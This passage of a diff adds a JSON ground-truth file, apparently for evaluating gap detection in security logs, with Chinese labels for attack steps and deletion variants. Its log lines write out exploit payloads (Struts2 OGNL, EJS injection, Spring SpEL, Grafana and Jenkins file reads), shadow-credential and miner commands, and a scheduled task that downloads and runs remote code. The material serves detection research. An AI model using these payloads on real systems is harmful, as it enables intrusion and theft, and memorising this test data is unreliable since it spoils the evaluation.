+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（wget）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1116": {
+   "unit": 1116,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "影凭据攻击（Whisker 写 msDS-KeyCredentialLink + certipy auth）",
+   "source_sequence": [
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（Whisker.exe）",
+     "n_lines": 1,
+     "lines": [
+      "Whisker.exe add /target:dc01$ /domain:corp.local /path:dc01.pfx <== CORP\\jdoe"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（certipy）",
+     "n_lines": 1,
+     "lines": [
+      "certipy auth -pfx dc01.pfx -dc-ip 10.20.3.10 -username DC01$ certipy certipy auth <== /bin/bash -c"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（certipy）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（certipy）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（certipy）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（certipy）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1010": {
+   "unit": 1010,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Jenkins CLI 任意文件读取 CVE-2024-23897（@/etc/passwd 风格）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/cli）",
+     "n_lines": 2,
+     "lines": [
+      "/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3",
+      "/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-java-134.ops-corp.com/cli {\"file_read\": \"@/etc/passwd\", \"cli\": \"help\"} Mozilla/5.0 (Windows NT 11."
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cat）",
+     "n_lines": 1,
+     "lines": [
+      "cat /var/lib/jenkins/config.xml <== /bin/sh -c 'cat config.xml' <== java -jar /opt/app/jenkins.war"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（cat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1005": {
+   "unit": 1005,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Struts2 S2-045（Content-Type 头 OGNL 表达式注入）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/user/login.action）",
+     "n_lines": 2,
+     "lines": [
+      "/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0",
+      "/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-tomcat-71.ops-corp.com/user/login.action {\"ognl\": \"(#cmd='id')\"} Mozilla/5.0 (Windows NT 10.0; Win"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（id;hostname）",
+     "n_lines": 1,
+     "lines": [
+      "id;hostname /usr/bin/id id;hostname <== /bin/sh -c 'id;hostname' <== /usr/local/tomcat/bin/catalina.sh"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（id;hostname）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1076": {
+   "unit": 1076,
+   "stratum": "new_with_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Node.js EJS 模板注入（outputFunctionName → mainModule 加载 child_process）CVE-2022-29078",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/api/render）",
+     "n_lines": 2,
+     "lines": [
+      "/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil",
+      "/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-node-126.ops-corp.com/api/render {\"ejs\": \"outputFunctionName\", \"exec\": \"obfuscated-require\"} Mozil"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（whoami）",
+     "n_lines": 1,
+     "lines": [
+      "whoami C:\\Windows\\System32\\whoami.exe whoami <== cmd.exe /c whoami <== node.exe C:\\app\\server.js"
+     ]
+    },
+    {
+     "step_id": "S4",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（schtasks）",
+     "n_lines": 1,
+     "lines": [
+      "schtasks /create /tn Updater /tr \"powershell -c IEX(iwr 10.20.5.19/a)\" /sc minute /mo 5 schtasks schtasks <== "
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3,
+      4
+     ],
+     "variant": "full",
+     "n_lines": 5,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3,
+      4
+     ],
+     "variant": "del1",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del2",
+     "n_lines": 3,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2",
+      "S4"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S4",
+       "label": "主机命令（schtasks）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3,
+      4
+     ],
+     "variant": "delweb",
+     "n_lines": 4,
+     "n_steps": 4,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3",
+      "S4"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1003": {
+   "unit": 1003,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Spring Cloud Gateway Actuator SpEL（CVE-2022-22947 新增路由触发 RCE）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/actuator/gateway）",
+     "n_lines": 2,
+     "lines": [
+      "/actuator/gateway {\"name\":\"RewritePath\",\"args\":{\"_genkey_0\":\"#{T(java.lang.Runtime)}\"}} Mozilla/5.0 (X11; Linu",
+      "/actuator/gateway {\"name\":\"RewritePath\",\"args\":{\"_genkey_0\":\"#{T(java.lang.Runtime)}\"}} Mozilla/5.0 (X11; Linu"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-spring-95.ops-corp.com/actuator/gateway {\"spel\": \"#{T(java.lang.Runtime)}\"} Mozilla/5.0 (X11; Linu"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（ssh）",
+     "n_lines": 1,
+     "lines": [
+      "ssh -o StrictHostKeyChecking=no -i /tmp/.k root@10.20.4.23 id ssh ssh -o StrictHostKeyChecking=no -i /tmp/.k <"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（ssh）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1017": {
+   "unit": 1017,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Grafana 插件路径穿越 CVE-2021-43798（读取 grafana.db / grafana.ini）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/public/plugins/alertlist/）",
+     "n_lines": 2,
+     "lines": [
+      "/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "rasp"
+     ],
+     "label": "应用侧证据（RASP 命中）",
+     "n_lines": 1,
+     "lines": [
+      "https://app-go-109.ops-corp.com/public/plugins/alertlist/ {\"traversal\": \"etc/grafana.db\"} Mozilla/5.0 (Windows"
+     ]
+    },
+    {
+     "step_id": "S3",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cat）",
+     "n_lines": 1,
+     "lines": [
+      "cat /etc/grafana/grafana.ini <== /bin/sh -c 'cat /etc/grafana/grafana.ini' <== grafana-server"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1,
+      2,
+      3
+     ],
+     "variant": "full",
+     "n_lines": 4,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1,
+      3
+     ],
+     "variant": "del1",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S3"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "del2",
+     "n_lines": 2,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2",
+      "S3"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "应用侧证据（RASP 命中）",
+     "gt_next_sources": [
+      "rasp"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "应用侧证据（RASP 命中）",
+       "sources": [
+        "rasp"
+       ]
+      },
+      {
+       "step_id": "S3",
+       "label": "主机命令（cat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0,
+      2,
+      3
+     ],
+     "variant": "delweb",
+     "n_lines": 3,
+     "n_steps": 3,
+     "observed_steps": [
+      "S1",
+      "S2",
+      "S3"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [
+      {
+       "step_id": "S1",
+       "missing_sources": [
+        "web"
+       ]
+      }
+     ],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [
+      "web"
+     ],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    }
+   ]
+  },
+  "1045": {
+   "unit": 1045,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "挖矿进程 xmrig 连接矿池（高 CPU 占用）",
+   "source_sequence": [
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（xmrig）",
+     "n_lines": 1,
+     "lines": [
+      "xmrig -o stratum+tcp://10.20.5.77:3333 -u 4ANf8kQ -p x xmrig xmrig <== /bin/sh -c '/tmp/.kr/xmrig -o st'"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0
+     ],
+     "variant": "full",
+     "n_lines": 1,
+     "n_steps": 1,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del1",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（xmrig）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（xmrig）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "删步后无日志（等同 blind 条件）",
+     "kept_idx": [],
+     "variant": "del2",
+     "n_lines": 0,
+     "n_steps": 1,
+     "observed_steps": [],
+     "missing_steps": [
+      "S1"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S1",
+     "gt_next_label": "主机命令（xmrig）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S1",
+       "label": "主机命令（xmrig）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1058": {
+   "unit": 1058,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "备份接口路径穿越读取配置（WAF 命中、应用无日志）",
+   "source_sequence": [
+    "waf",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf"
+     ],
+     "label": "Web 入口（/api/v1/backup/download）",
+     "n_lines": 1,
+     "lines": [
+      "/api/v1/backup/download file=../../../../etc/app/config.yml&mode=raw Mozilla/5.0 (Linux; Android 14; Pixel 8) "
+     ]
+    },
+    {
+     "step_id": "S2",
+     "sources": [
+      "hids"
+     ],
+     "label": "主机命令（cat）",
+     "n_lines": 1,
+     "lines": [
+      "cat /etc/app/cfg.yml /bin/cat cat /etc/app/cfg.yml <== /bin/sh -c 'cat /etc/app/cfg.yml' <== /opt/app/backupd"
+     ]
+    }
+   ],
+   "variants": [
+    {
+     "scorable": true,
+     "note": "对照：不应报缺口",
+     "kept_idx": [
+      0,
+      1
+     ],
+     "variant": "full",
+     "n_lines": 2,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1",
+      "S2"
+     ],
+     "missing_steps": [],
+     "partial_source_steps": [],
+     "gt_gap_expected": false,
+     "gt_missing_sources": [],
+     "gt_next_step": null,
+     "gt_next_label": null,
+     "gt_next_sources": null,
+     "gt_missing_labels": []
+    },
+    {
+     "scorable": true,
+     "note": "",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del1",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cat）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    },
+    {
+     "scorable": false,
+     "note": "与 del1 等价（只有 2 步）",
+     "kept_idx": [
+      0
+     ],
+     "variant": "del2",
+     "n_lines": 1,
+     "n_steps": 2,
+     "observed_steps": [
+      "S1"
+     ],
+     "missing_steps": [
+      "S2"
+     ],
+     "partial_source_steps": [],
+     "gt_gap_expected": true,
+     "gt_missing_sources": [],
+     "gt_next_step": "S2",
+     "gt_next_label": "主机命令（cat）",
+     "gt_next_sources": [
+      "hids"
+     ],
+     "gt_missing_labels": [
+      {
+       "step_id": "S2",
+       "label": "主机命令（cat）",
+       "sources": [
+        "hids"
+       ]
+      }
+     ]
+    }
+   ]
+  },
+  "1066": {
+   "unit": 1066,
+   "stratum": "new_no_candidate",
+   "gt_class": "new",
+   "gt_case": "",
+   "technique": "Node.js vm2 沙箱逃逸（process.binding('spawn_sync') 直接起进程）",
+   "source_sequence": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "steps": [
+    {
+     "step_id": "S1",
+     "sources": [
+      "waf",
+      "web"
+     ],
+     "label": "Web 入口（/api/v1/report/preview）",
+     "n_lines": 2,
+     "lines": [
